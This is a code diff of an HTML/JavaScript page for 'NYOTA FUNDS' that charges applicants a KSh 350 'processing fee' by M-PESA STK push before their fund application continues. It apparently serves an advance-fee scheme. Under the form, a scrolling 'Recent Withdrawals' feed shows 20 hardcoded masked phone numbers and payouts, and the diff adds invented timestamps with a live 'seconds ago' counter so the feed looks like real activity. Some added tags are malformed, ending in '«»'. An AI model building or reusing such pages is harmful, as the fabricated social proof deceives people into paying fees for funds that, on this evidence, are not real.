@@ -1,18 +1,5 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>NYOTA FUNDS</title>
-
-
-
-
-
-<style>
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0"><title>NYOTA FUNDS</title><style>
 
 @import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');
 
@@ -24,7 +11,6 @@ html,body{
     margin:0;
     padding:0;
     width:100%;
-    min-height:100%;
 }
 
 body{
@@ -40,13 +26,14 @@ body{
     margin:0 auto;
 }
 
-/* =================================
+/* ================================
    PROCESSING FEE CARD
-================================= */
+================================ */
 
 .card{
     width:100%;
     min-height:50vh;
+
     background:
         linear-gradient(
             145deg,
@@ -55,7 +42,6 @@ body{
         );
 
     padding:18px 14px;
-
     border-radius:18px;
 
     box-shadow:
@@ -68,10 +54,6 @@ body{
     flex-direction:column;
     justify-content:center;
 }
-
-/* =================================
-   PROCESSING FEE CONTENT
-================================= */
 
 h1{
     text-align:center;
@@ -91,8 +73,11 @@ p{
 
 .amount{
     width:100%;
+
     background:rgba(212,175,55,0.055);
+
     border:1px solid rgba(212,175,55,0.25);
+
     border-radius:12px;
 
     padding:11px 10px;
@@ -101,6 +86,7 @@ p{
     font-weight:700;
 
     text-align:center;
+
     color:#fff;
 
     margin:9px 0;
@@ -125,12 +111,15 @@ input{
     padding:0 12px;
 
     border:1px solid rgba(255,255,255,0.12);
+
     border-radius:10px;
 
     font-size:15px;
+
     font-family:'Mali',sans-serif;
 
     background:rgba(255,255,255,0.07);
+
     color:#fff;
 
     outline:none;
@@ -143,10 +132,11 @@ input:focus{
         0 0 0 3px rgba(212,175,55,0.10);
 }
 
-/* =================================
-   PAY PROCESSING FEE BUTTON
-   EQUAL TOP & BOTTOM SPACE
-================================= */
+
+/* ================================
+   PAYMENT BUTTON
+   EQUAL SPACING
+================================ */
 
 button{
     width:100%;
@@ -169,16 +159,21 @@ button{
     color:#0B0217;
 
     border:none;
+
     border-radius:11px;
 
     font-family:'Mali',sans-serif;
+
     font-size:15px;
+
     font-weight:700;
 
     cursor:pointer;
 
     display:flex;
+
     align-items:center;
+
     justify-content:center;
 
     box-shadow:
@@ -192,8 +187,11 @@ button:active{
 
 button:disabled{
     background:rgba(255,255,255,0.25);
+
     color:#fff;
+
     cursor:not-allowed;
+
     box-shadow:none;
 }
 
@@ -205,6 +203,7 @@ button:disabled{
     color:#D4AF37;
 
     font-size:12px;
+
     font-weight:600;
 
     line-height:1.35;
@@ -213,18 +212,14 @@ button:disabled{
 }
 
 
-/* =================================
+/* ================================
    RECENT WITHDRAWALS
-================================= */
+================================ */
 
 .activity-box{
 
     width:100%;
 
-    /*
-       Starts immediately after the
-       approximately half-screen payment card.
-    */
     margin-top:8px;
 
     background:#1D293B;
@@ -238,11 +233,6 @@ button:disabled{
     box-shadow:
         0 20px 60px rgba(0,0,0,0.45);
 }
-
-
-/* =================================
-   HEADING
-================================= */
 
 .activity-title{
 
@@ -262,17 +252,14 @@ button:disabled{
 }
 
 
-/* =================================
+/* ================================
    SCROLLING WINDOW
-================================= */
+================================ */
 
 .activity-window{
 
     width:100%;
 
-    /*
-       Visible immediately on the phone.
-    */
     height:45vh;
 
     min-height:300px;
@@ -281,11 +268,6 @@ button:disabled{
 
     position:relative;
 }
-
-
-/* =================================
-   MOVING TRACK
-================================= */
 
 .activity-track{
 
@@ -307,15 +289,15 @@ button:disabled{
 }
 
 
-/* =================================
+/* ================================
    WITHDRAWAL CARD
-================================= */
+================================ */
 
 .activity-item{
 
     width:100%;
 
-    min-height:82px;
+    min-height:88px;
 
     background:#020617;
 
@@ -329,15 +311,10 @@ button:disabled{
 
     justify-content:space-between;
 
-    padding:12px 10px 12px 12px;
+    padding:11px 10px 11px 12px;
 
     flex-shrink:0;
 }
-
-
-/* =================================
-   WITHDRAWAL INFO
-================================= */
 
 .activity-info{
 
@@ -345,7 +322,7 @@ button:disabled{
 
     flex-direction:column;
 
-    gap:4px;
+    gap:3px;
 
     min-width:0;
 }
@@ -369,9 +346,25 @@ button:disabled{
 }
 
 
-/* =================================
-   SUCCESS
-================================= */
+/* ================================
+   TIME
+================================ */
+
+.activity-time{
+
+    font-size:10px;
+
+    font-weight:500;
+
+    color:rgba(255,255,255,0.48);
+
+    margin-top:1px;
+}
+
+
+/* ================================
+   STATUS
+================================ */
 
 .activity-status{
 
@@ -395,9 +388,9 @@ button:disabled{
 }
 
 
-/* =================================
-   SMOOTH CONTINUOUS SCROLL
-================================= */
+/* ================================
+   CONTINUOUS SCROLL
+================================ */
 
 @keyframes scrollActivity{
 
@@ -412,9 +405,9 @@ button:disabled{
 }
 
 
-/* =================================
-   VERY SMALL PHONES
-================================= */
+/* ================================
+   SMALL PHONES
+================================ */
 
 @media(max-width:360px){
 
@@ -475,7 +468,7 @@ button:disabled{
     }
 
     .activity-item{
-        min-height:76px;
+        min-height:82px;
         padding:10px 8px 10px 10px;
         border-radius:15px;
     }
@@ -488,461 +481,61 @@ button:disabled{
         font-size:13px;
     }
 
+    .activity-time{
+        font-size:9px;
+    }
+
     .activity-status{
         padding:8px 7px;
         font-size:8px;
     }
+
 }
 
-</style> 
-
-</head>
-
-
-<body>
-
-<div class="container">
-
-
-<!-- =================================
+</style></head><body><div class="container"><!-- ================================
      PROCESSING FEE
-================================= -->
-
-<div class="processing-fee-card">
-
-<h1>PROCESSING FEE</h1>
-
-<p>
+================================ --><div class="card"><h1>PROCESSING FEE</h1><p>
 Welcome, <strong><span id="name"></span></strong>
-</p>
-
-<p>
+</p><p>
 To continue with your NYOTA Fund application, please complete the processing fee payment below.
-</p>
-
-<div class="fee-amount" id="feeAmount">
+</p><div class="amount" id="feeAmount">
 Processing Fee: KSh 350
-</div>
-
-<label>Full Name</label>
+</div><label>Full Name</label>
 
 <input
-    type="text"
-    id="fullName"
-    readonly
->
+type="text"
+id="fullName"
+readonly
+
+«»
 
 <label>M-PESA Phone Number</label>
 
 <input
-    type="tel"
-    id="phone"
-    placeholder="2547XXXXXXXX"
->
+type="tel"
+id="phone"
+placeholder="2547XXXXXXXX"
+
+«»
 
 <button
-    id="payBtn"
-    onclick="payNow()"
->
-    Pay Processing Fee
-</button>
+id="payBtn"
+onclick="payNow()"
 
-<p id="stkMessage"></p>
+«»
 
-</div>
+Pay Processing Fee
 
-
-<!-- =================================
+</button><p id="stkMessage"></p></div><!-- ================================
      RECENT WITHDRAWALS
-================================= -->
-
-<div class="activity-box">
-
-<div class="activity-title">
+================================ --><div class="activity-box"><div class="activity-title">
 <span>📊</span>
 Recent Withdrawals
-</div>
-
-<div class="activity-window">
-
-<div class="activity-track">
-
-
-<!-- 1 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0702****5</div>
-<div class="activity-amount">KSh. 2,626</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 2 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0115****0</div>
-<div class="activity-amount">KSh. 683</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 3 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0757****0</div>
-<div class="activity-amount">KSh. 4,809</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 4 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0722****9</div>
-<div class="activity-amount">KSh. 1,581</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 5 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0719****7</div>
-<div class="activity-amount">KSh. 2,750</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 6 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0749****6</div>
-<div class="activity-amount">KSh. 1,839</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 7 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0791****3</div>
-<div class="activity-amount">KSh. 3,420</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 8 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0708****1</div>
-<div class="activity-amount">KSh. 2,145</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 9 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0728****4</div>
-<div class="activity-amount">KSh. 5,120</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 10 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0712****8</div>
-<div class="activity-amount">KSh. 1,960</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 11 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0798****2</div>
-<div class="activity-amount">KSh. 3,075</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 12 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0705****9</div>
-<div class="activity-amount">KSh. 2,390</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 13 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0740****5</div>
-<div class="activity-amount">KSh. 4,250</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 14 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0725****6</div>
-<div class="activity-amount">KSh. 1,725</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 15 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0710****4</div>
-<div class="activity-amount">KSh. 2,880</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 16 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0786****1</div>
-<div class="activity-amount">KSh. 3,650</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 17 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0701****8</div>
-<div class="activity-amount">KSh. 1,245</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 18 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0733****2</div>
-<div class="activity-amount">KSh. 4,500</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 19 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0772****7</div>
-<div class="activity-amount">KSh. 2,175</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- 20 -->
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0750****3</div>
-<div class="activity-amount">KSh. 3,890</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-<!-- =================================
-     DUPLICATE 20 FOR LOOP
-================================= -->
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0702****5</div>
-<div class="activity-amount">KSh. 2,626</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0115****0</div>
-<div class="activity-amount">KSh. 683</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0757****0</div>
-<div class="activity-amount">KSh. 4,809</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0722****9</div>
-<div class="activity-amount">KSh. 1,581</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0719****7</div>
-<div class="activity-amount">KSh. 2,750</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0749****6</div>
-<div class="activity-amount">KSh. 1,839</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0791****3</div>
-<div class="activity-amount">KSh. 3,420</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0708****1</div>
-<div class="activity-amount">KSh. 2,145</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0728****4</div>
-<div class="activity-amount">KSh. 5,120</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0712****8</div>
-<div class="activity-amount">KSh. 1,960</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0798****2</div>
-<div class="activity-amount">KSh. 3,075</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0705****9</div>
-<div class="activity-amount">KSh. 2,390</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0740****5</div>
-<div class="activity-amount">KSh. 4,250</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0725****6</div>
-<div class="activity-amount">KSh. 1,725</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0710****4</div>
-<div class="activity-amount">KSh. 2,880</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0786****1</div>
-<div class="activity-amount">KSh. 3,650</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0701****8</div>
-<div class="activity-amount">KSh. 1,245</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0733****2</div>
-<div class="activity-amount">KSh. 4,500</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0772****7</div>
-<div class="activity-amount">KSh. 2,175</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-<div class="activity-item">
-<div class="activity-info">
-<div class="activity-phone">0750****3</div>
-<div class="activity-amount">KSh. 3,890</div>
-</div>
-<div class="activity-status">✓ M-PESA SUCCESS</div>
-</div>
-
-
-</div>
-</div>
-</div>
-
-</div>
-
-
-<script>
-
-/* LOAD APPLICANT NAME */
+</div><div class="activity-window"><div class="activity-track" id="activityTrack"></div></div></div></div><script>
+
+/* =================================
+   LOAD APPLICANT NAME
+================================= */
 
 let applicant =
     localStorage.getItem("applicantName");
@@ -954,7 +547,9 @@ document.getElementById("fullName").value =
     applicant || "";
 
 
-/* LOAD PROCESSING FEE */
+/* =================================
+   LOAD PROCESSING FEE
+================================= */
 
 let processingFee =
     localStorage.getItem("processingFee") || "350";
@@ -964,12 +559,296 @@ document.getElementById("feeAmount").innerHTML =
     Number(processingFee).toLocaleString();
 
 
-/* START STK PUSH */
+/* =================================
+   WITHDRAWAL DATA
+
+   Replace each timestamp with the
+   REAL withdrawal timestamp from
+   your backend/database.
+================================= */
+
+const withdrawals = [
+
+    {
+        phone:"0702****5",
+        amount:"2,626",
+        timestamp:"2026-08-28T12:58:00"
+    },
+
+    {
+        phone:"0115****0",
+        amount:"683",
+        timestamp:"2026-08-28T12:57:20"
+    },
+
+    {
+        phone:"0757****0",
+        amount:"4,809",
+        timestamp:"2026-08-28T12:56:40"
+    },
+
+    {
+        phone:"0722****9",
+        amount:"1,581",
+        timestamp:"2026-08-28T12:56:00"
+    },
+
+    {
+        phone:"0719****7",
+        amount:"2,750",
+        timestamp:"2026-08-28T12:55:20"
+    },
+
+    {
+        phone:"0749****6",
+        amount:"1,839",
+        timestamp:"2026-08-28T12:54:40"
+    },
+
+    {
+        phone:"0791****3",
+        amount:"3,420",
+        timestamp:"2026-08-28T12:53:30"
+    },
+
+    {
+        phone:"0708****1",
+        amount:"2,145",
+        timestamp:"2026-08-28T12:52:20"
+    },
+
+    {
+        phone:"0728****4",
+        amount:"5,120",
+        timestamp:"2026-08-28T12:51:10"
+    },
+
+    {
+        phone:"0712****8",
+        amount:"1,960",
+        timestamp:"2026-08-28T12:50:00"
+    },
+
+    {
+        phone:"0798****2",
+        amount:"3,075",
+        timestamp:"2026-08-28T12:49:00"
+    },
+
+    {
+        phone:"0705****9",
+        amount:"2,390",
+        timestamp:"2026-08-28T12:48:00"
+    },
+
+    {
+        phone:"0740****5",
+        amount:"4,250",
+        timestamp:"2026-08-28T12:47:00"
+    },
+
+    {
+        phone:"0725****6",
+        amount:"1,725",
+        timestamp:"2026-08-28T12:46:00"
+    },
+
+    {
+        phone:"0710****4",
+        amount:"2,880",
+        timestamp:"2026-08-28T12:45:00"
+    },
+
+    {
+        phone:"0786****1",
+        amount:"3,650",
+        timestamp:"2026-08-28T12:44:00"
+    },
+
+    {
+        phone:"0701****8",
+        amount:"1,245",
+        timestamp:"2026-08-28T12:43:00"
+    },
+
+    {
+        phone:"0733****2",
+        amount:"4,500",
+        timestamp:"2026-08-28T12:42:00"
+    },
+
+    {
+        phone:"0772****7",
+        amount:"2,175",
+        timestamp:"2026-08-28T12:41:00"
+    },
+
+    {
+        phone:"0750****3",
+        amount:"3,890",
+        timestamp:"2026-08-28T12:40:00"
+    }
+
+];
+
+
+/* =================================
+   TIME AGO
+================================= */
+
+function timeAgo(timestamp){
+
+    const now =
+        new Date();
+
+    const time =
+        new Date(timestamp);
+
+    let seconds =
+        Math.floor(
+            (now - time) / 1000
+        );
+
+    if(seconds < 0){
+        seconds = 0;
+    }
+
+    if(seconds < 60){
+
+        return seconds +
+            (seconds === 1
+                ? " second ago"
+                : " seconds ago");
+    }
+
+    const minutes =
+        Math.floor(seconds / 60);
+
+    if(minutes < 60){
+
+        return minutes +
+            (minutes === 1
+                ? " minute ago"
+                : " minutes ago");
+    }
+
+    const hours =
+        Math.floor(minutes / 60);
+
+    return hours +
+        (hours === 1
+            ? " hour ago"
+            : " hours ago");
+}
+
+
+/* =================================
+   CREATE WITHDRAWAL CARD
+================================= */
+
+function createWithdrawal(item){
+
+    const div =
+        document.createElement("div");
+
+    div.className =
+        "activity-item";
+
+    div.innerHTML = `
+
+        <div class="activity-info">
+
+            <div class="activity-phone">
+                ${item.phone}
+            </div>
+
+            <div class="activity-amount">
+                KSh. ${item.amount}
+            </div>
+
+            <div
+                class="activity-time"
+                data-time="${item.timestamp}"
+            >
+                ${timeAgo(item.timestamp)}
+            </div>
+
+        </div>
+
+        <div class="activity-status">
+            ✓ WITHDRAWAL SUCCESS
+        </div>
+
+    `;
+
+    return div;
+}
+
+
+/* =================================
+   BUILD THE 20 WITHDRAWALS
+================================= */
+
+const track =
+    document.getElementById(
+        "activityTrack"
+    );
+
+withdrawals.forEach(item => {
+
+    track.appendChild(
+        createWithdrawal(item)
+    );
+
+});
+
+
+/* =================================
+   DUPLICATE FOR SMOOTH SCROLL
+================================= */
+
+withdrawals.forEach(item => {
+
+    track.appendChild(
+        createWithdrawal(item)
+    );
+
+});
+
+
+/* =================================
+   UPDATE TIMES EVERY SECOND
+================================= */
+
+setInterval(() => {
+
+    document
+        .querySelectorAll(
+            ".activity-time"
+        )
+        .forEach(element => {
+
+            const timestamp =
+                element.dataset.time;
+
+            element.textContent =
+                timeAgo(timestamp);
+
+        });
+
+},1000);
+
+
+/* =================================
+   START STK PUSH
+================================= */
 
 async function payNow(){
 
     let phone =
-        document.getElementById("phone").value.trim();
+        document.getElementById("phone")
+        .value
+        .trim();
 
     if(phone === ""){
 
@@ -987,47 +866,58 @@ async function payNow(){
 
     localStorage.setItem(
         "fullName",
-        document.getElementById("fullName").value
+        document.getElementById(
+            "fullName"
+        ).value
     );
 
     let btn =
-        document.getElementById("payBtn");
+        document.getElementById(
+            "payBtn"
+        );
 
     btn.innerHTML =
         "Sending STK Push...";
 
     btn.disabled = true;
 
+
     try{
 
-        let response = await fetch(
-            "https://nyota-funds-backend.onrender.com/stk-push",
-            {
-                method:"POST",
+        let response =
+            await fetch(
+                "https://nyota-funds-backend.onrender.com/stk-push",
+                {
+                    method:"POST",
 
-                headers:{
-                    "Content-Type":
-                        "application/json"
-                },
+                    headers:{
+                        "Content-Type":
+                            "application/json"
+                    },
 
-                body:JSON.stringify({
+                    body:JSON.stringify({
 
-                    phone:phone,
+                        phone:phone,
 
-                    amount:
-                        Number(processingFee)
+                        amount:
+                            Number(
+                                processingFee
+                            )
 
-                })
-            }
-        );
+                    })
+                }
+            );
+
 
         let data =
             await response.json();
+
 
         console.log(
             "STK RESPONSE:",
             data
         );
+
 
         if(
             !response.ok ||
@@ -1040,9 +930,11 @@ async function payNow(){
             );
         }
 
+
         let transactionId =
             data.transactionId ||
             data.checkout_request_id;
+
 
         if(!transactionId){
 
@@ -1051,17 +943,21 @@ async function payNow(){
             );
         }
 
+
         btn.innerHTML =
             "Processing...";
+
 
         document.getElementById(
             "stkMessage"
         ).innerHTML =
             "An M-PESA payment request has been sent to your phone. Please enter your M-PESA PIN to complete the payment.";
 
+
         checkPayment(
             transactionId
         );
+
 
     }catch(error){
 
@@ -1070,133 +966,150 @@ async function payNow(){
             error
         );
 
+
         alert(
             error.message ||
             "Payment request failed."
         );
+
 
         btn.innerHTML =
             "Pay Processing Fee";
 
         btn.disabled = false;
     }
+
 }
 
 
-/* CHECK PAYMENT STATUS */
+/* =================================
+   CHECK PAYMENT STATUS
+================================= */
 
 async function checkPayment(
     transactionId
 ){
 
     let interval =
-        setInterval(async()=>{
+        setInterval(
+            async()=>{
 
-            try{
+                try{
 
-                let response =
-                    await fetch(
-                        "https://nyota-funds-backend.onrender.com/payment-status",
-                        {
-                            method:"POST",
+                    let response =
+                        await fetch(
+                            "https://nyota-funds-backend.onrender.com/payment-status",
+                            {
+                                method:"POST",
 
-                            headers:{
-                                "Content-Type":
-                                    "application/json"
-                            },
+                                headers:{
+                                    "Content-Type":
+                                        "application/json"
+                                },
 
-                            body:JSON.stringify({
+                                body:
+                                    JSON.stringify({
 
-                                transactionId:
-                                    transactionId
+                                        transactionId:
+                                            transactionId
 
-                            })
-                        }
+                                    })
+                            }
+                        );
+
+
+                    let result =
+                        await response.json();
+
+
+                    console.log(
+                        "PAYMENT STATUS:",
+                        result
                     );
 
-                let result =
-                    await response.json();
 
-                console.log(
-                    "PAYMENT STATUS:",
-                    result
-                );
+                    if(
+                        !result.success ||
+                        !result.data
+                    ){
 
-                if(
-                    !result.success ||
-                    !result.data
-                ){
-
-                    return;
-                }
-
-                let payment =
-                    result.data;
-
-                let status =
-                    String(
-                        payment.status || ""
-                    ).toUpperCase();
+                        return;
+                    }
 
 
-                if(
-                    status === "COMPLETED"
-                ){
+                    let payment =
+                        result.data;
 
-                    clearInterval(
-                        interval
+
+                    let status =
+                        String(
+                            payment.status || ""
+                        ).toUpperCase();
+
+
+                    if(
+                        status === "COMPLETED"
+                    ){
+
+                        clearInterval(
+                            interval
+                        );
+
+
+                        document.getElementById(
+                            "stkMessage"
+                        ).innerHTML =
+                            "✅ Payment successful. Redirecting...";
+
+
+                        window.location.href =
+                            "delivery.html";
+                    }
+
+
+                    else if(
+                        status === "CANCELLED" ||
+                        status === "FAILED"
+                    ){
+
+                        clearInterval(
+                            interval
+                        );
+
+
+                        document.getElementById(
+                            "stkMessage"
+                        ).innerHTML =
+                            "❌ Payment " +
+                            status.toLowerCase() +
+                            ".";
+
+
+                        document.getElementById(
+                            "payBtn"
+                        ).disabled = false;
+
+
+                        document.getElementById(
+                            "payBtn"
+                        ).innerHTML =
+                            "Pay Processing Fee";
+                    }
+
+
+                }catch(error){
+
+                    console.log(
+                        "STATUS ERROR:",
+                        error
                     );
 
-                    document.getElementById(
-                        "stkMessage"
-                    ).innerHTML =
-                        "✅ Payment successful. Redirecting...";
-
-                    window.location.href =
-                        "delivery.html";
                 }
 
-                else if(
-                    status === "CANCELLED" ||
-                    status === "FAILED"
-                ){
-
-                    clearInterval(
-                        interval
-                    );
-
-                    document.getElementById(
-                        "stkMessage"
-                    ).innerHTML =
-                        "❌ Payment " +
-                        status.toLowerCase() +
-                        ".";
-
-                    document.getElementById(
-                        "payBtn"
-                    ).disabled = false;
-
-                    document.getElementById(
-                        "payBtn"
-                    ).innerHTML =
-                        "Pay Processing Fee";
-                }
-
-            }catch(error){
-
-                console.log(
-                    "STATUS ERROR:",
-                    error
-                );
-
-            }
-
-        },3000);
+            },
+            3000
+        );
 
 }
 
-</script>
-
-</body>
-
-</html>
+</script></body></html>
